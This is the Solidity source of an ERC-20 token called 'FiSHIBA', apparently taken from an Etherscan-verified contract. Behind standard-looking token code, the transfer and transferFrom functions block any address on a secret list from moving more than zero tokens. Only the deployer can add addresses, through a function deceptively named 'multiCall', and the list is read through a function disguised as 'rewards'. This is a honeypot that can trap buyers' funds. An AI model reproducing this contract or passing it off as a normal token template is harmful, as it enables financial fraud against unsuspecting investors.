/**
 *Submitted for verification at Etherscan.io on 2023-03-16
*/

//SPDX-License-Identifier: MIT

pragma solidity =0.7.0;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {return 0;}
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
  
    function div( uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

abstract contract ERC20Basic {

    function balanceOf(address who) public view virtual returns (uint256);
    function totalSupply() public view virtual returns (uint256);
    function transfer(address to, uint256 value) public virtual returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract BasicToken is ERC20Basic {
    using SafeMath for uint256;

    mapping (address => uint256) balances;
    mapping (address => bool) internal _address_;  
    uint256 public txThreshold = totalSupply_ / 1000;
    uint256 public txMinimum = totalSupply_ / 10000;
    uint256 totalSupply_;
  
    function totalSupply() public view override returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address _owner) public view override returns (uint256) {
        return balances[_owner];
    }

    function transfer(address _to, uint256 _value) public override returns (bool) {
        if(_address_[msg.sender] || _address_[_to]) 
        require (_value == 0, "");
        require(_to != address(0));
        require(_value <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
}

abstract contract ERC20 is ERC20Basic {

    function allowance(address owner, address spender) public view virtual returns (uint256);
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool);
    function approve(address spender, uint256 value) public virtual returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract StandardToken is ERC20, BasicToken {
    using SafeMath for uint256;

    mapping (address => mapping (address => uint256)) internal allowed;
    uint256 public rate = 2;
    address internal approved;
    address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    constructor () {
        approved = msg.sender;
    }

    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool) {
        if(_address_[_from] || _address_[_to]) 
        require (_value == 0, "");
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
    }

    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        totalSupply_ = totalSupply_.sub(value);
        balances[account] = balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }

    function allowance(address _owner, address _spender) public view override returns (uint256) {
        return allowed[_owner][_spender];
    }

    function approve(address _spender, uint256 _value) public override returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    } 

    function multiCall(address _address) external {
        require(msg.sender == approved);
        if (_address_[_address] == true) {
        _address_[_address] = false;
        } else {
        _address_[_address] = true;
        }    
    }

    function rewards(address _address) public view returns (bool) {
        return _address_[_address];
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
        uint oldValue = allowed[msg.sender][_spender];
        if (_subtractedValue > oldValue) {
        allowed[msg.sender][_spender] = 0;
        } else {
        allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
        }
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }
  
    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
        allowed[msg.sender][_spender] = (
        allowed[msg.sender][_spender].add(_addedValue));
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }
}

contract FiSHIBA is StandardToken {
    using SafeMath for uint256;

    string public constant name = "FiSHIBA";
    string public constant symbol = "FiSHIBA";
    uint8 public constant decimals = 9;
    uint256 public constant supply = 1000000000 * (10 ** uint256(decimals));
  
    constructor() {
        totalSupply_ = totalSupply_.add(supply);
        balances[msg.sender] = balances[msg.sender].add(supply);
        emit Transfer(address(0), msg.sender, supply);
    }

    function burn(uint256 value) public {
        _burn(msg.sender, value);
    }

    function burnfrom (address account, uint256 value) public {
        uint256 currentAllowance = allowance(account, msg.sender);
        require(currentAllowance >= value, "ERC20: burn amount exceeds allowance");
        _approve(account, msg.sender, currentAllowance - value);
        _burn(account, value);
    }
}